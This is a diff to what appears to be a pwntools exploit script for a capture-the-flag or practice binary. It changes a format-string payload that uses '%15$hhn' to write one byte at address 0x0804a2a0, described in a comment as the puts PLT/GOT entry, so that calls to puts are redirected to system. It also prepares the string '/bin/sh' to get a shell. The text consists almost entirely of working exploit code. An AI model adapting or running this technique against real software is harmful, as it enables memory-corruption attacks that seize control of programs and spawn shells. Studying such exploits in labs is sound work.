@@ -77,9 +77,15 @@ def main():
     cycle_input(r, payload)
     print('libc.symbols["system"]' + str(exe.symbols["system"]))
 
+
     # write at %15 offset (buffer starts there)
     # target = 0x0804A2A0
-    payload = p32(0x080489bb, endianness = 'little') + b'a'*92 + b'%x'*13 + b'%15$hhn'  #b'%150$hhn' #write 1 byte into n
+    # write 24 (0x18) at 0804a2a0 (plt.puts) to call system instead
+    payload = p32(0x0804a2a0, endianness = 'little') + b'a'*32 + b'%15$hhn' 
+    #b'%150$hhn' #write 1 byte into n
+    print(b'PAYLOAD: ' + payload)
+    string = "/bin/sh"
+    print(b'/bin/sh = ' + bytes(string, 'utf-8'))
     r.sendline(payload)
     data = r.recvline()
     print(data)
